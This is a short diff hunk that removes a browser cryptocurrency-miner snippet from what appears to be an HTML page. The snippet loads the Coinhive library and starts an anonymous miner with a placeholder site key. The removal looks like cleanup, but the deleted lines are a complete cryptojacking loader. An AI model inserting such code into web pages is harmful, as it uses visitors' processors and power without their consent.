@@ -1,6 +1,0 @@
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-
-<script>
-	var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
-	miner.start();
-</script>
